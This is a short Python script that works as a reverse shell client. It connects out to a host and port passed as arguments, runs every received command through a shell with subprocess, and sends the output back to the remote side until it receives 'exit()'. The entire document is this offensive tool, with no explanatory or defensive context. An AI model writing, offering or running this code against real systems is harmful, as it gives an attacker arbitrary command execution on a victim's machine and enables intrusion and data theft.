import socket, subprocess as sp, sys

host = str(sys.argv[1])
port = int(sys.argv[2])

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
	command = str(client.recv(1024)) # reception data
	if command != "exit()":
		sh = sp.Popen(command, shell=True, stdout = sp.PIPE, stderr = sp.PIPE, stdin = sp.PIPE ) 
		out, err = sh.communicate()
		result = str(out) + str(err)
		length = str(len(result)).zfill(16)
		client.send(length + result)
	else:
		break
client.close()